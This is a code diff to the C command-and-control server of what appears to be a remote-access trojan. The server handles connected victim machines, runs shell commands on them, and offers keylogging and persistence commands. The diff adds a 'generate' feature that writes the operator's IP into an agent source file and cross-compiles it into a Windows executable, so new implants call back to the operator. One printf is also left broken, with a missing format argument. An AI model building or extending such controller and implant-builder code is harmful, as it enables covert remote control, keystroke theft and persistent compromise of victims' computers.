@@ -20,6 +20,9 @@
  #define MAX_CLIENTS 10
  #define BUFFER_SIZE 1024
  #define RESPONSE_BUFFER_SIZE 18384
+
+ #define SOURCE_AGENT_FILE "agent.c"
+ #define OUTPUT_AGENT_FILE "agent.exe"
  
  typedef struct {
      int socket;                 /**< Socket descriptor of the client. */
@@ -132,6 +135,65 @@
      return strspn(str, " \t\n\r") == strlen(str);
  }
  
+
+void update_agent_file(const char *new_ip) {
+    FILE *file = fopen(SOURCE_AGENT_FILE, "r");
+    if (!file) {
+        printf("\033[1;31m[ERROR] Could not open %s\033[0m\n", SOURCE_AGENT_FILE);
+        return;
+    }
+
+    char buffer[8192];
+    fread(buffer, 1, sizeof(buffer), file);
+    fclose(file);
+
+    char new_define[256];
+    snprintf(new_define, sizeof(new_define), "#define SERVER_IP \"%s\"", new_ip);
+    char *old_define = strstr(buffer, "#define SERVER_IP");
+    
+    if (!old_define) {
+        printf("\033[1;31m[ERROR] IP line not found in code.\033[0m\n");
+        return;
+    }
+
+    file = fopen(SOURCE_AGENT_FILE, "w");
+    if (!file) {
+        printf("\033[1;31m[ERROR] Could not write to %s\033[0m\n", SOURCE_AGENT_FILE);
+        return;
+    }
+
+    fwrite(buffer, 1, old_define - buffer, file);
+    fprintf(file, "%s\n", new_define);
+    fwrite(old_define + strcspn(old_define, "\n") + 1, 1, strlen(old_define), file);
+    fclose(file);
+
+    printf("[*] IP updated on %s to %s\033[0m\n", SOURCE_AGENT_FILE, new_ip);
+}
+
+void compile_agent() {
+    char command[256];
+    snprintf(command, sizeof(command), "i686-w64-mingw32-gcc -o %s %s -lwininet -lwsock32", OUTPUT_AGENT_FILE, SOURCE_AGENT_FILE);
+
+    printf("Compiling the new agent...\033[0m");
+    int result = system(command);
+    if (result == 0) {
+        printf("\033[0;32m [*] Compilation successful: %s generated.\033[0m\n", OUTPUT_AGENT_FILE);
+    } else {
+        printf("\033[1;31m[ERROR] Compilation error.\033[0m\n");
+    }
+}
+
+void generate_agent_with_ip() {
+    char new_ip[16];
+
+    printf("Enter the new IP for the agent: ");
+    fgets(new_ip, sizeof(new_ip), stdin);
+    strtok(new_ip, "\n");
+
+    update_agent_file(new_ip);
+    compile_agent();
+}
+
  /**
   * @brief Displays a list of available server commands.
   * 
@@ -140,18 +202,18 @@
   */
  void help_command() {
      printf("\n\033[1;36mAvailable Commands:\033[0m\n");
-     printf("\033[1;32mclients\033[0m        - List all connected clients.\n");
-     printf("\033[1;32mselect <index>\033[0m - Select a client to interact with.\n");
-     printf("\033[1;32mdeselect\033[0m      - Deselect the currently selected client.\n");
-     printf("\033[1;32mexit\033[0m          - Exit the server.\n");
-     printf("\033[1;32mhelp\033[0m          - Show this help menu.\n");
+     printf("\033[1;32mclients\033[0m        - List all connected clients.\033[0m\n");
+     printf("\033[1;32mselect <index>\033[0m - Select a client to interact with.\033[0m\n");
+     printf("\033[1;32mdeselect\033[0m      - Deselect the currently selected client.\033[0m\n");
+     printf("\033[1;32mexit\033[0m          - Exit the server.\033[0m\n");
+     printf("\033[1;32mhelp\033[0m          - Show this help menu.\033[0m\n");
      printf("\n\033[1;36mCommands for Selected Client:\033[0m\n");
-     printf("\033[1;32m<command>\033[0m      - Execute a command on the selected client.\n");
-     printf("\033[1;32mexit\033[0m          - Stop interacting with the client.\n");
-     printf("\033[1;32mq\033[0m             - Disconnect the selected client.\n");
-     printf("\033[1;32mcd <dir>\033[0m      - Change directory on the client.\n");
-     printf("\033[1;32mkeylog_start\033[0m  - Start keylogging on the client.\n");
-     printf("\033[1;32mpersist\033[0m       - Make the client persistent.\n");
+     printf("\033[1;32m<command>\033[0m      - Execute a command on the selected client.\033[0m\n");
+     printf("\033[1;32mexit\033[0m          - Stop interacting with the client.\033[0m\n");
+     printf("\033[1;32mq\033[0m             - Disconnect the selected client.\033[0m\n");
+     printf("\033[1;32mcd <dir>\033[0m      - Change directory on the client.\033[0m\n");
+     printf("\033[1;32mkeylog_start\033[0m  - Start keylogging on the client.\033[0m\n");
+     printf("\033[1;32mpersist\033[0m       - Make the client persistent.\033[0m\n");
  }
  
  /**
@@ -174,12 +236,15 @@
          if (strncmp(command, "clients", 7) == 0) {
              list_clients();
          }
+         else if (strncmp(command, "generate", 8) == 0) {
+            generate_agent_with_ip();
+         }
          else if (strncmp(command, "select ", 7) == 0) {
              int index = atoi(command + 7);
              pthread_mutex_lock(&clients_mutex);
              if (index >= 0 && index < MAX_CLIENTS && clients[index].socket > 0) {
                  selected_client = index;
-                 printf("\033[0;32mClient [%d] selected.\033[0m\n");
+                 printf("\033[0;32m [*] Client [%d] selected.\033[0m\n");
                  struct timeval timeout;
                  timeout.tv_sec = 5;
                  timeout.tv_usec = 0;
@@ -188,7 +253,7 @@
                      jump:
                          bzero(&command, sizeof(command));
                          bzero(&response, sizeof(response));
-                         printf("* Shell#%s\033[0;32m~$: ", inet_ntoa(clients[selected_client].address.sin_addr));
+                         printf("* Shell#%s\033[0;32m~$: \033[0m", inet_ntoa(clients[selected_client].address.sin_addr));
                          fgets(command, sizeof(command), stdin);
                          strtok(command, "\n");
                          
@@ -197,7 +262,7 @@
                              break;
                          }
                          else if (strncmp(command, "help", 4) == 0) {
-                             help_command()
+                             help_command();
                          }
                          else {
                              write(clients[selected_client].socket, command, sizeof(command));                        
@@ -224,7 +289,7 @@
                  }
              } 
              else {
-                 printf("Invalid index.\n");
+                 printf("Invalid index.\033[0m\n");
              }
              pthread_mutex_unlock(&clients_mutex);
          }
@@ -245,11 +310,12 @@
          }
          else if (is_empty_or_whitespace(command)) {}
          else {
-             printf("Command %s not found.\n", command);        
+             printf("Command %s not found.\033[0m\n", command);        
          }
      }
  }
  
+ #ifndef TESTING
  int main() {
      int server_socket, new_socket;
      struct sockaddr_in server_addr, client_addr;
@@ -258,7 +324,7 @@
  
      server_socket = socket(AF_INET, SOCK_STREAM, 0);
      if (server_socket == -1) {
-         perror("Error creating socket");
+         perror("\033[1;31m[ERROR] Error creating socket.\033[0m");
          exit(EXIT_FAILURE);
      }
  
@@ -270,12 +336,12 @@
      setsockopt(server_socket, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
  
      if (bind(server_socket, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
-         perror("Error binding");
+         perror("\033[1;31m[ERROR] Error binding.\033[0m");
          exit(EXIT_FAILURE);
      }
  
      if (listen(server_socket, MAX_CLIENTS) < 0) {
-         perror("Error listening");
+         perror("\033[1;31m[ERROR] Error listening\033[0m");
          exit(EXIT_FAILURE);
      }
  
@@ -288,14 +354,14 @@
          new_socket = accept(server_socket, (struct sockaddr*)&client_addr, &addr_len);
  
          if (new_socket < 0) {
-             perror("Error in accept");
+             perror("\033[1;31m[ERROR] Error in accept.\033[0m");
              continue;
          }
  
          int index = add_client(new_socket, client_addr);
  
          if (index == -1) {
-             printf("Maximum number of clients reached, refusing connection.\n");
+             printf("\033[1;33m[WARNING] Maximum number of clients reached, refusing connection.\033[0m\n");
              close(new_socket);
          }
          else {
@@ -307,4 +373,4 @@
      return 0;
  }
  
- 
+#endif
